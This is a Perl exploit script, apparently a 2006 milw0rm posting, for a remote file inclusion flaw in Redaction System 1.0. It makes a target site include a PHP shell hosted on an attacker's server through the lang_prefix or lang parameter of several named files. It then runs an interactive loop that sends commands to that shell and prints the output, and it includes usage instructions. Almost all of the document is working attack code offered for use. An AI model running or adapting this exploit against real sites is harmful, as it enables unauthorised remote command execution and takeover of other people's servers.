<html><head><title>Redaction System 1.0 (lang_prefix) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl

use LWP::UserAgent;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$fileno = @ARGV[3];

if(!$target || !$shellsite)
{
    usage();
}

header();

if ($fileno eq 1)
{
    $file = &quot; conn.php?lang_prefix=&quot;;
}
elsif ($fileno eq 2)
{
    $file = &quot;index.php?lang=&quot;;
}
elsif ($fileno eq 3)
{
    $file = &quot;sesscheck.php?lang_prefix=&quot;;
}
elsif ($fileno eq 4)
{
    $file = &quot;wap/conn.php?lang_prefix=&quot;;
}
elsif ($fileno eq 5)
{
    $file = &quot;wap/sesscheck.php?lang_prefix=&quot;;
}
else
{
    $file = &quot;conn.php?lang_prefix=&quot;;
}

while()
{
    print &quot;[cmd]\$&quot;;
    while (&lt;STDIN&gt;)
    {
        $cmd = $_;
        chomp($cmd);
print $target.'/'.$file.'='.$shellsite.'?&amp;'.$shellcmd.'='.$cmd;
        $xpl = LWP::UserAgent-&gt;new() or die;
        $req = HTTP::Request-&gt;new(GET=&gt;$target.'/'.$file.'='.$shellsite.'?&amp;'.$shellcmd.'='.$cmd) or die(&quot;\n\n Failed to connect.&quot;);
        $res = $xpl-&gt;request($req);
        $rp = $res-&gt;content;
        $rp =~ tr/[\n]/[&amp;#234;]/;
print $rp;
        if (!cmd)
        {
            print &quot;\nEnter command: \n&quot;;
            $rp = &quot;&quot;;
        }
        elsif ($rp=~/failed to open stream: HTTP request failed!/ || $rp=~/: Cannot execute a blank command in &lt;b&gt;/)
        {
            print &quot;\nUnable to connect to Shellsite, or invalid command variable\n&quot;;
            exit;
        }
        elsif ($rp=~/^&lt;br.\/&gt;.&lt;b&gt;Warning/)
        {
            print &quot;\nInvalid Command\n\n&quot;;
            exit;
        }
       
        if ($rp=~ /(.+)&lt;br.\/&gt;.&lt;b&gt;Warning.(.+)&lt;br.\/&gt;.&lt;b&gt;Warning/)
        {
            $final = $1;
            $final=~ tr/[&amp;#234;]/[\n]/;
            print &quot;\n$final\n&quot;;
        }
        else
        {
            print &quot;[cmd]\$ &quot;;
        }
    }
}

sub header()
{
    print q
    {
######################################################################
       Redaction System 1.0000 - Remote Include Exploit
        Vulnerability discovered and exploit by r0ut3r
               writ3r@gmail.com
          Special thanks to Warpboy's perl tutorial
             http://milw0rm.com/papers/85
######################################################################
    };
}

sub usage()
{
header();
    print q
    {
######################################################################
Usage:
perl rs_xpl.pl &lt;Target website&gt; &lt;Shell Location&gt; &lt;CMD Variable&gt; &lt;No&gt;
&lt;Target Website&gt; - Path to target eg: www.rsvuln.target.com
&lt;Shell Location&gt; - Path to shell eg: www.badserver.com/s.txt
&lt;CMD Variable&gt; - Shell command variable name eg: cmd
&lt;No&gt; - File number, corresponding to:
1: conn.php
2: index.php
3: sesscheck.php
4: wap/conn.php
5: wap/sesscheck.php
######################################################################
    };
exit();
}

# milw0rm.com [2006-10-12]</pre></html>